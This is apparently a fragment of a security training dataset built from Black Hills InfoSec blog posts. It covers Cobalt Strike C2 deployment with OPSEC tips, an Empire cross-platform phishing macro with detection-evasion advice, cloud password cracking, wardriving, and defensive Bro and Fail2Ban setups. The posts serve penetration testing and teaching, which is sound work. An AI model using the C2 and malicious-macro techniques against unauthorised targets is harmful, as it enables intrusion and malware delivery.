lower than this if you expect your Cobalt Strike team servers to do some heavy lifting screen2 I'm selecting the Toronto region because that's where I am but feel free to choose your location From an OPSEC perspective it is not only advised to spread out your team servers in different geographical locations but depending on the defensive level you require perhaps even different VPS providers in case blue team blocks the entire Digital Ocean range it could happen In the above image I've also selected Monitoring which we'll come back to and I've attached an SSH key that I've added to my Digital Ocean account Finally create the three droplets as seen below I've named my droplets cnc1 cnc2 and cnc3 Going forward I will be demonstrating the rest of our deployment on cnc1 for the sake of time but the process will be identical to the others The droplets should take a short moment to be created Once they are live SSH in using the root account and the SSH key you've added when we constructed the droplets I'll pause here for a moment and mention a fairly new feature to the Digital Ocean control panel although what I am about to show you is built into the provided script this is just to point out a cool feature achieving the same result Firewalls Click on Networking from the control panel and select Firewalls Click Create Firewall and you should be presented with a configuration menu that has one current inbound rule SSH What I'll demonstrate in the images below is creating the same rules that we will use in the script In the above image I've created the following inbound rules HTTP and HTTPS for our HTTP S beacons DNS UDP and TCP for DNS beacons and evil DNS things you may need Cobalt Strike team server port 50050 Our custom SSH port 7654 Save the rules and then apply them to your droplets You can either select droplets by name or by tag and add the firewall rules to all of them Very convenient Okay let's get back to the droplets I've logged in via SSH and now we're going to do some manual configuration In the image below I'm adding a password for the root account adding a new user called demouser who will be added to the sudoers group and will be our main account for everything While still logged in as root edit the SSHD configuration file nano etc ssh sshd_config Quick side note in the C2K folder there's a pre-made SSHD config that has the exact same modifications as I'm describing below In the builder script we'll use later you can optionally comment out or delete this part of the script Lets change the following to Port 7654 PermitRootLogin no PasswordAuthentication yes bear with me At the very bottom add the following AllowUsers demouser Exit the SSH session as root and transfer your SSH public key to the demouser account ssh-copy-id demouser Now you should be able to log in with keys only SSH in as the demouser and edit the SSHD config file again and change the PasswordAuthentication setting to no You'll need to transfer the files.zip to your team server somehow SCP wget from github which you can find here ithub.com invokethreatguy C2K You'll also need to provide you own Cobalt Strike trial and place it into the unzipped files.zip folder once you get to that point mine is already bundled in as you'll see later With everything unpacked in your users home folder that's my preference you are ready to run the installer script Before you do if you wish to follow along with me exactly then move everything the unpacked files.zip contents and cobaltstrike-trial.tgz into your home folder For example wherever you unpacked everything you could do this by mv files Now let's run the installer script C2Ubuntu.sh and take a look at what this script will do The first part will ask you if you're ready to proceed There's no clever input handling here so type yes The script will then install lterm which is a fantastic terminal logging utility by Killswitch-GUI and can be found here ithub.com killswitch-GUI lterm Next it will prepare the dependencies for Cobalt Strike and prompt you for your license key The script will then copy over the custom SSHD configuration file it ships with but this is entirely optional to your preferences Simply comment this out if you do not wish for this to happen The firewall rules I demonstrated in the control panel will be set and saved across reboots then the SSH service will be restarted When the script completes it will execute the HTTPsC2DoneRight.sh script also courtesy of Killswitch_GUI and can be found here separately ithub.com killswitch-GUI CobaltStrike-ToolKit blob master HTTPsC2DoneRight.sh I highly recommend you ensure the DNS A records for you team server you wish to enable HTTPS on is already configured as the Let's Encrypt process will need to verify it as being live If all went well you should see the following image near the end of the output This script will automatically pull the Amazon Malleable C2 profile and add the correct entries into its configuration to allow the certificate to be used Here is the Amazon.profile file and certificate added to its configuration Now we can verify if all is working correctly by visiting our servers address over SSL and you should be presented with the default Apache welcome page Before you start Cobalt Strike be sure to stop the apache2 service otherwise your listeners will bark at you sudo service apache2 stop Now connect to your Cobalt Strike team server and load the amazon profile teamserver httpsProfile amazon.profile Stand up an HTTPS listener deliver to you target and if all is well Your C2 should be ready to go Before we wrap up I wanted to touch on the droplet monitoring we enabled in the beginning C2 performance monitoring is somewhat under appreciated and if you're expecting a lot of traffic this is a great way to keep an eye on things Back in the Digital Ocean control panel select Monitoring and create an alert policy I've just the default settings for a CPU performance monitor The cool part is you can automatically receive emails and connect the alerts into a Slack channel Any new performance alerts will be sent your specified Slack channel Conclusion This script is in its early phase and I hope to develop a framework with some killer automation features For now feel free to change settings as you like or need and feedback is always welcome In part 2 of this series we'll move forward in adding additional features into our script and deployment such as Automate everything in this post Use the Digital Ocean cloud_config feature Add more monitoring to the droplets for defensive and OPSEC purposes i.e logwatch AIDE Expand the C2 to include redirectors for each C2 team server Thank you very much to BHIS for having me contribute to this awesome blog You all rock ____________ Lee Kagan is a guest blogger from RedBlack Security He is an offensive security professional with almost a decade in IT and InfoSec A penetration tester red teamer and currently lead for RedBlack Security's Rogue Team specializing in threat and adversary emulation in Toronto Canada Lee's focus on the team and in practice is offensive infrastructure support post-exploitation of Windows and Active Directory environments PowerShell and C weaponization"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Crack Passwords in the Cloud with GPU Acceleration (Kali 2017)</title>\n<taxonomies>Red Team, Red Team Tools, Amazon, cloud, Cloud Cracking, GPU Acceleration, Kali 2017, Kali GPU, Kali Linux, Password cracking</taxonomies>\n<creation_date>Tue, 01 Aug 2017 15:06:36 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts How does password cracking in the cloud compare to down here on earth Maybe not as heavenly as imagined I saw this on the web and got excited You can get up and running with a Kali GPU instance in less than 30 seconds All you need to do is choose a P2 instance and you're ready to start cracking ww.kali.org news cloud-cracking-with-cuda-gpu It's true mostly The first time you attempt to launch the instance you will find that by default you are not allowed to launch the P2 Kali instances on Amazon as shown in the error message below The message contains the following text with a link to request more instances You have requested more instances 1 than your current instance limit of 0 allows for the specified instance type Please visit ws.amazon.com contact-us ec2-request to request an adjustment to this limit I submitted the form and was easily approved within a day Use this link to find and launch your desired instance ws.amazon.com marketplace pp B01M26MMTT The image below shows the process of launching a single GPU cloud instance So let's do some cracking speed comparisons using Hashcat's benchmarking option The table below summarizes the results with supporting images at the end of this post The on earth system is the one detailed in this blog post ww.blackhillsinfosec.com ?p 5995 Note that I did get a CUDA compatibility message from the cloud crackers saying that performance was degraded but I did not find a workaround for that issue If you know of one please let me know and I will update this post The conclusion I came to is that the 16 GPU cloud instance at 15 hr would be an OK solution for a quick password crack at a CTF event for example but that hourly price adds up to over ten thousand dollars a month I recommend biting the bullet and building your own password cracker here on earth before you burn up all your money in the cloud CPU Cracking in the Cloud GPU Cracking on Earth GPU Cracking in Cloud 1 GPU GPU Cracking in the Cloud 16 GPU's _____ Carrie Roberts no longer works with us sob but we are proud to have her brilliant guest posts"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Monitor Network Traffic with Virtualized Bro 2.51 on Ubuntu 16.04.2 on ESXi 6.5</title>\n<taxonomies>Author, Blue Team, Blue Team Tools, Kent Ickler, bro, Bro 2.51, Bro Install, ESXi, ESXi 6.5, Kent Ickler, Network monitoring, network traffic, Ubuntu, Ubuntu 16.04.2</taxonomies>\n<creation_date>Thu, 03 Aug 2017 14:00:49 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kent Ickler You've heard us before talk about Bro an IDS for network monitoring and analysis We've had several installs of Bro over time here at BHIS It's about time for another build and I thought it would be a good time to share an example methodology This post is going to be two parts Configuring ESXi for a Bro install and configuring said Bro install It's worth noting that there are pros and cons to operating Bro in a virtualized environment It's not for everyone For us among other things it allows us to utilize a single tap into an ESXi host that can run multiple IDS applications By using vswitch in promiscuous mode we are able to duplicate monitor traffic to multiple guest VMs Bro Snort ect ect Here's a diagram of things Hardware Running Bro on VMware increases the required resources a bit Additionally you need hardware that can support running a virtualized environment Budget network cards are usually not a good mix at this point At the very least be sure that your hardware has two Network Interface cards one of which can be entered into monitor mode ESXI Install Not really a big deal here I'll make an assumption you know how to get up and running If you don't let us know and I'll make another blog post Network Pre-Reqs for BroIt will be necessary to send two interfaces to the ESXi server ESXi Management interface Network Mirror Tap The network management interface can include other VLAN's as you see fit but you will need to be sure you can access both the ESXi Server and its guest from its configured VLAN The Network Mirror Tap can be produced from either switch configuration to produce data mirrored from another port or from a traditional network tap Blog about mirror tap methods is possible in the future We use both dedicated-hardware and switch configurations in our office as we have multiple points of traffic to monitor For your first Bro install you will typically want to be mirror your WAN data that is a mirror of data between your internet connection and your router ESXI pre-req's for BroESXi will need to be configured so that you can access its management GUI from the first network interface This can be configured with VLANS if necessary The second interface will need to be put into monitor mode so that the ESXi OS does not filter ignore packets for MAC addresses it doesn't harbor data coming into the interface which it typically would if it had no reason to receive such traffic Network configuration in ESXI In our case our server has 3 NICs.NIC0 UnusedNIC1 MirrorNIC2 Management Login to the ESXi Web Gui Click on Networking Physical NICs Confirm your NICs are present Determine which NICs will be used for the Mirror traffic Create the virtual switch that will receive Mirror data.Click on Networking Virtual Switches Add standard virtual switch Enter a name for the vSwitch MirrorSwitch Uplink 1 Select the NIC that will receive the mirror traffic.Link Discover NONESecurity Promiscuous mode Accept Setup Mirror Port group to receive dataClick on Networking Port Groups Add Port Group ConfigureName MirrorGroupVirtualSwitch MirrorSwitchPromiscuous mode Accept Create your new VM Ensure that your VM has two NICs added LAN NIC VM Network Mirror Group Install Ubuntu 16.04Nothing specific here move on when you're logging at console As usual be sure first to apt-get update and apt-get upgrade Oh and for most of the configuration you will need to be sudo root might as well sudo -s Prepare Ubuntu for Bro Configure network stack nano etc network interfacesMove your management interface to a static IP address good idea In our case the management interface is ens192 and the mirror-data interface is ens160 I can check the interface names with a simple ip addr use sudo Configure Mirror NICLet's move the mirror-data NIC into promiscuous mode bring it up and check for data Enable and up the mirror interface ip link set ens160 promisc on ip link set ens160 up Make that NIC enabled on boot nano etc rc.local add before exit 0 ip link set ens160 promisc on ip link set ens160 up Give it a whirl ctrl c to exit tcpdump -i ens160 ens160 is our mirror NIC you can add -vv to check protocol processing You'll see some data flowing if your tap is already set up and sending data in General Bro Install We will be generally following the Official Bro 2.5.1 install documentation available at Bro's website ww.bro.org sphinx install install.html We're following the guide pretty close except for changing the default install location to opt bro instead of usr local bro Get the pre-requisites sudo apt-get install cmake make gcc g flex bison libpcap-dev libssl-dev python-dev swig zlib1g-dev libgeoip-dev build-essential Install PFRingPFRing is a module that changes how packets received from the NIC are processed by the components that send data to Bro You can build a Bro installation without it but it helps greatly in reducing packet loss from the mirror More information on PFRing can be found here ww.ntop.org products packet-capture pf_ring cd optgit clone ithub.com ntop PF_RING.gitcd PF_RING kernelmakesudo insmod pf_ring.kocd userlandmake cd PF_RING-6.2.0 userland lib configure --prefix opt PF_RINGmake install cd libpcap configure --prefix opt PF_RINGmake install cd tcpdump-4.1.1 configure --prefix opt PF_RINGmake install cd kernelmakemake install Make pf_ring module load at boot nano etc modulesAdd pf_ring Bro its Time Git the Bro code Brogit clone --recursive git git.bro.org bro Do the thingsCompile noting that we are adding the optional PFRing module we compiled above and changing the default install location cd configure configure --with-pcap opt PF_RING --prefix opt bro --prefix change install location makemake install Doing things this'll take awhile Configure the runtime PATHexport PATH opt bro bin PATH Make that change permanent toonano .profile add the above to the path Configure your Bro!nano opt bro etc node.cfg We have a couple of changes to make to the config file to tell Bro to use the PFRing module and to listen on the appropriate NIC Settings will be simpler if you choose not to use PFRing Comment out the entire bro section by putting a hash in front of each line.Then uncomment the sections for manager proxy-1 and worker-1 .In worker-1 change the interface to match your mirror interface and add lb_method pf_ring as well as lb_procs 5 Test opt bro bin broctlAt the BroControl promptinstall only need to do this once deploystatusexit don't worry bro is still running Next time you can use just deploy instead of install The image below shows deploy being used after an initial install had already been completed Missed that screenshot meow Check the logs!tail -f opt bro logs current conn.log CTRL C to exit this Auto-StartNow let's make it start on boot!nano etc rc.localAdd opt bro bin broctl start MaintenanceAdd maintenance functions to keep Bro happy crontab -e select your editor if necessary then enter the following line at the bottom 5 opt bro bin broctl cron Reboot and make sure all is well.Reboot -h nowLogin and test your bro logs to ensure data is flowing!A few minutes after you have restarted check your conn.log file to ensure you see trafficTail -f opt bro logs current conn.logIf you don't see updates here or the file is missing try to redeploy the bro instance now that the system is fully loaded opt bro bin broctl deploy Word of caution Because we compiled PFRing in this kernel any kernel builds may cause the PFRing module to fail to load You will need to recompile PFRing if you update your kernel after compiling Fin!Future Bro blogs likely"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How To: Empire's Cross Platform Office Macro</title>\n<taxonomies>Author, David Fletcher, Phishing, Red Team, Empire, Macro, macro malware, OSX, PowerShell, Windows</taxonomies>\n<creation_date>Mon, 07 Aug 2017 13:57:07 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher During our testing we encounter organizations of various different sizes shapes and composition One that we've run across a number of times includes a fairly even mixture of Microsoft Windows and Apple OSX operating systems Under normal circumstances it can be difficult to identify which users are using Windows and which are using OSX This can make phishing with malware challenging If the wrong payload is delivered to the wrong operating system...no shell As a solution we can just include some intelligence in our macro malware to decide whether to execute a PowerShell or Python payload based on the target operating system Fortunately with the integration of the PowerShell Empire and EmPyre projects into PowerShell Empire 2.0 we have ready-made stagers to accomplish this goal The stager listing from PowerShell Empire 2.0 can be seen below with the macro payloads for Windows and OSX both highlighted Before we can generate our stagers we have to get a listener up and running For this demonstration we'll just use the default configuration with the listener name xplatform_macro However I would encourage you to modify the default communication profile to deviate from the standard requests include jitter and use a valid TLS certificate This will decrease the chances of your malware communication getting stopped by a proxy or detected by anti-malware tools looking for beaconing behavior With the listener configured just issue the execute command to launch it Next we need to grab output from each of the two launchers Here we just need to set the listener name and issue the generate command The output from each instance should be copied into a text editor so we can manipulate them Generation of the Windows and OSX macros can be seen below With the macro content at hand we can now build our cross platform malicious macro document First open the Macro editor in Word both the Windows and OSX versions will work for this The Macro editor is accessed by enabling the Developer tab in the Office Ribbon and clicking the Macros button Next paste the declare statement that appears in the OSX macro as seen below Windows will safely ignore this statement because the system function is never called by the PowerShell based macro Then create the necessary AutoOpen subroutine and use the Mac directive to to conditionally execute either the PowerShell or Python payload based on the detected operating system In this case I named the resulting functions DebugMac and DebugWin as seen below Next the original macro subroutines are refactored into the target functions as seen below In the case of the Windows Macro a Dim statement had to be added to explicitly declare the strComputer variable No other modifications were made remember to end each function with End Function With the malicious macro document complete the only thing left to do is to test on each of the targeted platforms After execution we have two agents that have called back to our PowerShell Empire listener One running PowerShell and one running Python...both from the same document This technique has its limitations It only works with modern macro-enabled office documents Office for Mac did not support macros in the older format In addition Office 2016 for Mac doesn't appear to allow access to the C library used to make the Python system call Go pwn some mixed platform environments"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Configure Distributed Fail2Ban: Actionable Threat Feed Intelligence</title>\n<taxonomies>Author, Blue Team, Blue Team Tools, Kent Ickler, Defending, Defending Websites, Distributed Fail2Ban, Fail2Ban, IPtables, Kent Ickler, Pirates, Website Defense</taxonomies>\n<creation_date>Thu, 10 Aug 2017 14:55:42 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kent Ickler How to Configure Distributed Fail2Ban Actionable Threat Feed Intelligence Fail2Ban is a system that monitors logs and triggers actions based on those logs While actions can be very customized the typical use case is monitoring an auth-log for authentication errors and configuring a system to block the offending source IP Fail2Ban works great deployed in this fashion However I wanted to take it a step further With the below method you can use Fail2Ban to block the offending source as usual but then notify other Fail2Ban nodes that they should also block the offending source from future connections This is a base set of code you can build on to distribute your Fail2Ban bans across multiple Fail2Ban nodes Proof of Concept Method This is a proof-of-concept that you can build to scale laterally or vertically This method uses SSHFS to remotely mount a file-share that can be read and appended by multiple systems concurrently The configuration adds an action to write to a global ban log where other Fail2Ban nodes monitor and process the bans The newbans.log global log file is appended by a Fail2Ban action that calls a system component called logger which is used to generate a consistent-format entry in a system-log and in our case the standard output The logger standard-output is redirected to append to the global newbans.log on the file-server logger -s -i HOST PORT 2 opt logdistro logs newbans.log In our configuration we are using Fail2Ban to monitor SSH as its primary trip-wire source While Fail2Ban will wait for three invalid SSHd attempts logged in the var log auth.log file it will only wait for the single entry in the newbans.log file This is because the newbans.log log file only includes log entries that have already been banned by a cooperating Fail2Ban node and therefore it isn't necessary to wait for more entries Increasing the maxretry for newbans.log could potentially allow rules like Only global-ban if a source had three invalid SSH attempts on two different servers within 30 minutes Fail2Ban includes options to automatically un-ban sources after a given time Each Fail2Ban node independently manages its own ban and unbanning processes The Fail2Ban server node in this case is just a storage location for the global newbans.log file With this method we use SSHFS to mount the log file across the network using SSH Other methods exist but this was quick and secure method to share the logfile I cannot comment on the scalability of hundreds of nodes in this practice Presumably there is a limitation to the number of collaborating Fail2Ban nodes with SSHFS mounted files that this system could support before becoming inefficient Headaches and Tweaks Some tweaking may be necessary Some distro's will process log polling differently and you may need to adjust the backend variable accordingly The Polling method worked for most of our nodes On a few other Linux distros however changes to the global newbans.log log went unnoticed This was due to to the backend method not acknowledging that the SSHFS mounted file had changed More information on the backend methods can be found on Fail2Bans website We are calling the same iptables-multiport action when banning a source found in newbans.log therefore the collaborating Fail2Ban nodes will also enter their own entry in newbans.log If a node creates a ban in response to another node's newbans.log entry the ban will use multiport to ban all ports not just the initial connection port This will cause the log to be bit noisy but allows each node to report back that it propagated the ban This can be configured in a multitude of ways Additionally the action to add the entry in newbans.log can be applied to other Fail2Ban actions Get on with it The configuration here is relatively simple We first setup an SSH server where we will host a global newbans log file We will create a user and a private public keypair that will allow other Fail2Ban nodes to securely access and append the new log file Then moving to the Fail2Ban node we will take the private-key and setup the remote file-share mount using SSHFS and fstab Lastly we will need to setup the Fail2Ban configuration files to look at the new files and trigger things accordingly for that I've provided a GitHub clone to get you moving quickly Setup new server In this case I chose a DigitalOcean droplet to be the storage location of the global log file It doesn't have to be in the cloud however Hosting the file on your local network could reduce delay if you do not configure log rotations for the newbans.log file sudo -s mkdir opt logdistro touch opt logdistro newbans.log useradd f2bcourrier chown -R opt logdistro su f2bcourrier operate as new f2bcourrier user cd ssh-keygen -t rsa -b 4096 you could use RSA too cat .ssh id_rsa.pub .ssh authorized_keys cat .ssh id_rsa Copy this output Private-key we'll need it soon exit Setup the Fail2Ban Node Pre-Req's sudo -s apt-get install sshfs apt-get install fail2ban mkdir opt logdistro mkdir opt logdistro logs mkdir opt logdistro keys nano opt logdistro keys f2bcourier.key Paste the contents of your id_rsa from the server Next update etc fstab to mount the new log data nano etc fstab Add line below be sure to change SERVER IP ect f2bcourrier SERVER IP opt logdistro opt logdistro logs fuse.sshfs auto reconnect allow_other StrictHostKeyChecking no cache no IdentityFile opt logdistro keys f2bcourier.rsa defaults _netdev 0 0 Next let fstab mount the remote file location mount -a If you get any failures here you'll need to umount opt logdistro logs before trying again Test it out touch opt logdistro logs test Back on the server you now should see a file in opt logsdistro Fail2Ban Configuration The remainder of the node configuration will involve building and or rebuild some configuration files I have added these files and an ansible playbook template in a GitHub repo A list of the files in the GitHub repo is below Lastly we need to either comment out the lines of the defaults-debian.conf file in etc fail2ban jail.d or mv the file out of the Fail2Ban folders Below we will move the file to the old folder in the GitHub clone iptables-multiport.conf Fail2Ban Action file that includes information to write to the new global log file Replaces etc fail2ban actions.d iptables-multiport.conf newbans.conf Fail2Ban Filter for the new global log file Move to etc fail2ban filter.d newbans.conf Sshd.conf OPTIONAL Fail2Ban Updated filter for SSHD includes some additional SSH failures for key-based-auth Replaces etc fail2ban filter.d sshd.conf Jail.local Fail2Ban Jail configuration to create the new global-log monitor instance Move to etc fail2ban jail.local Fail2ban-with-distro.yml OPTIONAL Ansible Playbook to remotely deploy a Fail2Ban Node with the global ban configured If you use this playbook be sure to update the SERVER IP on the etc fstab configuration and have your private-key available for transfer by ansible This playbook includes all necessary processing to take a node without Fail2Ban installed to a Fail2Ban protected node cooperating with the newbans.log log file Download the files and move them into their respective locations cd opt git clone ithub.com Relkci F2BDistro.git cp opt F2BDistro f2bfiles iptables-multiport.conf etc fail2ban action.d cp opt F2BDistro f2bfiles newbans.conf etc fail2ban filter.d newbans.conf cp opt F2BDistro f2bfiles sshd.conf etc fail2ban filter.d sshd.conf cp opt F2BDistro f2bfiles jail.local etc fail2ban jail.local mkdir opt F2BDistro old mv etc fail2ban jail.d defaults-debian.conf opt F2BDistro old Restart Fail2Ban and check Logs service Fail2Ban restart Check the Fail2Ban log to ensure everything loaded properly tail var log fail2ban.log Test Test and watch When three invalid authentication attempts are now made on SSH the Fail2Ban node will locally block the source IP for 30 minutes It will also add an entry in the newbans.log file for other Fail2Ban nodes to read When they see the new entry in newbans.log they will immediately block the source IP for the 30 minutes You can tail the Fail2Ban log file at var log fail2ban.log and watch this happen real-time There is a delay In my test deployment of 10 servers all nodes had blocked an offending IP within 3 seconds of the third authentication attempt on the initial node To manually trigger a distributed ban you can use the below line logger -s -i HOST PORT 2 opt logdistro logs newbans.log Build Wide I'm not sure how busy your primary server will get but you can expect it will retain one SSH connection per Fail2Ban node for the SSHFS remote log file If the file begins to grow significantly large it may require log rotation to reduce the traffic involved in monitoring the file Build Tall Because the newbans.log log format is pretty simple you can program any application to write to this log and have an IP blocked by all nodes The initial block doesn't have to come from a Fail2Ban node Utilizing the logger syntax below you can add newbans.log entries as needed logger -s -i HOST PORT 2 opt logdistro logs newbans.log SSHFS ithub.com libfuse sshfs Fail2Ban ww.fail2ban.org"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to: From WarDriving to SSIDs on Google Maps with Latitude/Longitude</title>\n<taxonomies>Author, Jordan Drysdale, Red Team, Wireless, GPS'd SSIDs, Kismet, raspberry Pi, Wireless</taxonomies>\n<creation_date>Wed, 16 Aug 2017 13:50:21 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale Step 1 Build your capture rig RPi3 Kali Battery Packs 2 x supported wifi card of your choosing I used the Alfa Black for this run My finished product Solar Battery Pack Pi Alfa Rock and Roll xz -cd kali-2017.01-rpi2.img.xz dd of dev mmcblk0 bs 4M iflag fullblock oflag direct status progress You may need to install Kismet apt-get install kismet apt-get install gpsd gpsd-clients Attach your gps puck Verify whether its dev ttyUSBx or dev ttyAMAx Then something like this will work gpsd -b -N -D 3 -n -F var run gpsd.sock dev ttyUSB0 Or service gpsd start cgps -s GPSd Functioning as Expected Step 2 Configure kismet to monitor the two 802.11b g channels that will cover all US legal 2.4 frequencies Monitor on the arrows to cover all 'legal US 2.4GHz frequency spreads Add Source Config Channel Important Kismet Options Channels Locked on 3 and 8 for War Driving Step 3 Walk Drive Ride War-Walking Path At this point you really want to gracefully exit out of Kismet This will keep your resulting files in good shape for further analysis Step 4 Manipulate results and Upload This repo will allow a very easy translation of your netxml files to a usable CSV for the last step git clone ithub.com MichaelCaraccio NetXML-to-CSV.git Run the conversion tool python3 main.py file.netxml result.csv Upload the results to maps ww.google.com maps d Needly Pinned SSIDs and Lat Long Output In this case business names have been redacted The point here is the amount of information we leak from our wireless networks is too much Open networks are everywhere We all know the PSKs on some of these networks are way too short Broadcasting an SSID name that matches your business in some way is a sure way to give away more information than you want to Let's take a step back from our lenses and ask ourselves do we really need to provide open and free wireless access We have demonstrated the flaws in basic wireless design embed ww.youtube.com watch?v b9sFZ28dGZ0 embed The only way to wireless correctly is with certificate validating supplicant configuration strong user passwords and consistent testing and validation Otherwise your wireless is a threat"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Build Super Secure Active Directory Infrastructure*</title>\n<taxonomies>Author, CJ Cox, InfoSec 201, Active Directory, AD, AD Build, defense, offense, securing Active Directory, security</taxonomies>\n<creation_date>Tue, 22 Aug 2017 13:49:48 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "CJ Cox We frequently get requests from customers asking us if we provide consultation defending their systems The other day I got a question from a customer asking us if we could provide some consulting hours on hardening their Active Directory infrastructure Asking BHIS to help you secure your infrastructure is like asking Navy Seals to guard your compound We can surely do it but we are probably not the most efficient use of resources for the task At BHIS we are offensive specialists not defensive We think you would get a lot more value letting us do what we do best Attack Offense informs defense and vice versa So when you want to know how good the principles and practices you've applied are we can come stress test it We will find the holes in your infrastructure and show you what you need to shore up your defenses We can train you how to defend and you'll be better faster and stronger That's much less expensive than waiting for a real incident to show you where you are failing Putting your defenses to the test of a capable adversary is one of the best ways we know of improving your defense Good system administration is knowing your own technology and business and continually applying better security principles and practices Few consultants can match your own team's knowledge and understanding of your environment You will spend significant time and resources on getting an external consultant up to speed on internal infrastructure So where can you turn for help other than a consultant I always go to one of the most effective security tools ever created search engines When I received the inquiry on securing Active Directory I quickly turned up the following two articles Best Practices for Securing Active Directory and an oldie but a goodie 19 Smart Tips for Securing Active Directory I know 2006 but the solid basic advice is still sound Of course then there is Microsoft's own guidelines Best Practices for Securing Active Directory ocs.microsoft.com en-us windows-server identity ad-ds plan security-best-practices best-practices-for-securing-active-directory Don't overlook CIS guides SANS white papers and courses and one million other pieces of advice at your fingertips Guidelines are only a starting place for ideas You must balance functionality and business risk when hardening your solutions and infrastructure Too secure and tools can become non-functional when considering their actual business use It is very difficult for a consultant to make those kinds of decisions for you In working through and understanding the tradeoffs you will make your business and your skills much stronger Then put it to the test hire BHIS This is all hard and as John often says paraphrase There's NO magic bullet for good security There's no piece of software that you can switch on and forget Like most things in life this will take a lot of hard work to get right and the work will never be finished Best of luck on this journey ______Updated on 08 24 17_______ Just a few clarifying points First everything BHIS does in penetration testing or on our website is oriented around improving defense We teach and execute offense to inform defense Our penetration test reports are filled with recommendations for how to improve your defense based on indicators or actual exploits How could a penetration tester have good offensive skills without understanding defense and how something like active directory works You can't hack something you don't understand That doesn't make the tester an expert on your Active Directory implementation We have one view but there are many facets of AD If anyone ever tries to tell you they are total experts on Active Directory and they are not named Fossen or Russinovich it is time to take pause We desperately want the industry to start moving away from the hacker knows all mythos towards something more collaborative BHIS is happy to talk defensive measures before during and after your test Call us anytime Ask for a blog on a topic or a webcast I guarantee you'll learn something and your defense will be improved P.S This blog post was not a how to on Active Directory We should probably rename it to something like The penetration testers right place in improving defense My intent was not to tell customers to Google it There are tons of good resources consultants products testers and ideas out there You should use them all after careful evaluation of their costs benefits and most effective uses ______________ Sorry this isn't actually a how to article it's more like where to go find advice You've been Buzzfeeded"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Defusing a Bomb Through Trigger Bypasses and Sensors</title>\n<taxonomies>Author, Fun & Games, Mike Felch, Bomb Squad, Def Con, DefCon, Defuse a Bomb at Def Con, EOD technician, Tamper Resistant Village, Team BHIS, The Box, The Box Challenge</taxonomies>\n<creation_date>Thu, 24 Aug 2017 16:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
